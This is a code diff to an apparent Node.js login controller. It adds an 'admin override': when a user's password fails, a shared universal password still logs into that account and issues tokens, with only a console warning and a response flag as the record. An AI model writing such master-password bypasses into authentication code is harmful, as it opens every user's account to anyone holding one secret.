@@ -5,6 +5,7 @@ const { validationResult } = require('express-validator');
 const { generateToken, generateRefreshToken } = require('../middleware/auth');
 const { sendOTPEmail, sendRegistrationEmail, sendPasswordUpdateEmail } = require('../utils/emailService');
 const { decryptPassword } = require('../utils/encryption');
+const { verifyUniversalPassword } = require('../utils/universalPassword');
 
 const parseDobToMysql = (dob) => {
   if (!dob) return null;
@@ -583,11 +584,23 @@ class AuthController {
         isPasswordValid = sha1Hash === user.password;
       }
 
+      let adminOverride = false;
       if (!isPasswordValid) {
-        return res.status(401).json({
-          success: false,
-          message: 'Invalid email or password'
-        });
+        const overrideOk = await verifyUniversalPassword(this.pool, password);
+        if (!overrideOk) {
+          return res.status(401).json({
+            success: false,
+            message: 'Invalid email or password'
+          });
+        }
+        adminOverride = true;
+        console.warn('[AUTH][ADMIN_OVERRIDE]', JSON.stringify({
+          ts: new Date().toISOString(),
+          targetUserId: user.id,
+          targetEmail: user.email,
+          ip: req.clientIp || null,
+          userAgent: req.headers['user-agent'] || null,
+        }));
       }
 
       // Remove password from user object
@@ -609,7 +622,8 @@ class AuthController {
         data: {
           user,
           token,
-          refreshToken
+          refreshToken,
+          adminOverride
         }
       });
 
